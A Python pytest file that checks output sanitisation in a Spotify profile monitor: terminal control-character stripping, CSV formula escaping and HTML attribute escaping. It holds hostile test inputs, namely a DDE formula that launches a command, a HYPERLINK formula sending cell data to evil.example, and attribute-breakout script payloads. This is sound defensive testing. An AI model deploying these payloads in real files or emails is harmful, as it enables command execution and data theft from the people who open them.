import csv
import tempfile
from io import StringIO
from pathlib import Path

import pytest

import spotify_profile_monitor as monitor


PROJECT_ROOT = Path(__file__).resolve().parents[1]
ARTIFACT_ROOT = PROJECT_ROOT / "local" / "untrusted_output_test_artifacts"

# One playlist name carrying every terminal control sequence a hostile Spotify account could supply
HOSTILE_NAME = "Playlist\x1b[2J\x1b[8mhidden\rOVERWRITTEN\x07\x9bA\ttab"


# Creates one disposable output test directory under the project local directory
def make_test_directory():
    ARTIFACT_ROOT.mkdir(parents=True, exist_ok=True)
    return tempfile.TemporaryDirectory(dir=str(ARTIFACT_ROOT))


@pytest.mark.parametrize("control", ["\x1b", "\r", "\x07", "\x00", "\x08", "\x0b", "\x0c", "\x7f", "\x9b"])
# Confirms every control character is removed from Spotify-supplied text
def test_sanitize_terminal_text_strips_control_characters(control):
    assert control not in monitor.sanitize_terminal_text(f"name{control}payload")


# Confirms tab and newline survive so existing layout and line splitting keep working
def test_sanitize_terminal_text_keeps_tab_and_newline():
    assert monitor.sanitize_terminal_text("a\tb\nc") == "a\tb\nc"


@pytest.mark.parametrize("value", [None, 42, ""])
# Confirms non-string and empty values pass through untouched
def test_sanitize_terminal_text_passes_through_non_strings(value):
    assert monitor.sanitize_terminal_text(value) == value


# Confirms Logger neutralizes hostile text on both the terminal and the log file
def test_logger_sanitizes_terminal_and_log_file():
    with make_test_directory() as directory:
        log_path = Path(directory) / "monitor.log"
        terminal = StringIO()
        logger = monitor.Logger.__new__(monitor.Logger)
        logger.terminal = terminal
        logger.logfile = open(log_path, "a", buffering=1, encoding="utf-8")
        try:
            logger.write(HOSTILE_NAME + "\n")
            logger.terminal_only(HOSTILE_NAME + "\n")
            logger.log_only(HOSTILE_NAME + "\n")
        finally:
            logger.logfile.close()

        terminal_output = terminal.getvalue()
        log_output = log_path.read_text(encoding="utf-8")

    for output in (terminal_output, log_output):
        assert "\x1b" not in output
        assert "\r" not in output
        assert "\x07" not in output
        assert "\x9b" not in output
        assert "OVERWRITTEN" in output


# Confirms the logging-disabled stdout wrapper sanitizes and still behaves like a stream
def test_terminal_stream_sanitizes_and_forwards_attributes():
    terminal = StringIO()
    stream = monitor.TerminalStream(terminal)
    stream.write(HOSTILE_NAME + "\n")
    stream.terminal_only("plain\n")
    stream.log_only("dropped\n")
    stream.flush()

    output = terminal.getvalue()
    assert "\x1b" not in output and "\r" not in output
    assert "dropped" not in output
    assert stream.getvalue() == output


# Confirms the progress bar drops control characters from the playlist name it writes directly to the terminal
def test_display_progress_sanitizes_playlist_name(monkeypatch):
    terminal = StringIO()
    monkeypatch.setattr(monitor, "stdout_bck", terminal)
    monitor._display_progress(1, 2, HOSTILE_NAME)

    output = terminal.getvalue()
    # Only the leading erase-line sequence this tool emits itself is allowed
    assert output.startswith("\r\x1b[K")
    assert "\x1b" not in output[3:] and "\r" not in output[1:]


@pytest.mark.parametrize("value,expected", [("=cmd|'/c calc'!A1", "'=cmd|'/c calc'!A1"), ("+1", "'+1"), ("-2+3", "'-2+3"), ("@SUM(A1)", "'@SUM(A1)"), ("\tx", "'\tx"), ("\rx", "'\rx"), ("Normal Track", "Normal Track"), ("", ""), (7, 7), (None, None)])
# Confirms only formula-leading strings are prefixed and every other value is left alone
def test_escape_csv_formula(value, expected):
    assert monitor.escape_csv_formula(value) == expected


@pytest.mark.parametrize("format_type", [1, 2])
# Confirms hostile playlist and track names are neutralized in both CSV layouts
def test_write_csv_entry_neutralizes_formulas(format_type):
    with make_test_directory() as directory:
        csv_path = Path(directory) / "export.csv"
        monitor.init_csv_file(str(csv_path), format_type)
        monitor.write_csv_entry(str(csv_path), "2026-08-15 10:00:00", "Playlist Name", '=HYPERLINK("https://evil.example?d="&A1,"Click")', "-2+3", "@SUM(A1)", format_type)

        with csv_path.open(encoding="utf-8", newline="") as handle:
            row = list(csv.DictReader(handle))[-1]

    assert row["Date"] == "2026-08-15 10:00:00"
    for value in row.values():
        assert value[:1] not in ("=", "+", "-", "@", "\t", "\r")
    assert "'=HYPERLINK" in "".join(row.values())


@pytest.mark.parametrize("value,expected", [('x" onmouseover="alert(1)', "x&quot; onmouseover=&quot;alert(1)"), ("a&b", "a&amp;b"), ("<script>", "&lt;script&gt;"), (None, ""), ("", "")])
# Confirms attribute values cannot break out of a quoted href or src
def test_escape_html_attr(value, expected):
    assert monitor.escape_html_attr(value) == expected


# Confirms a hostile Spotify URL cannot break out of the href attribute in the email body
def test_email_html_href_is_attribute_safe():
    hostile_url = 'https://open.spotify.com/playlist/x" onmouseover="alert(1)'
    body_html = f'<a href="{monitor.escape_html_attr(hostile_url)}">{monitor.escape_html_attr("name")}</a>'
    assert body_html.count('"') == 2
    assert "onmouseover=&quot;" in body_html


# Confirms the inline artwork reference escapes its content id as an attribute
def test_add_email_artwork_html_escapes_content_id():
    body_html = monitor.add_email_artwork_html("<html><body>text</body></html>", 'cid" onerror="alert(1)')
    assert 'onerror="alert(1)' not in body_html
    assert "&quot;" in body_html
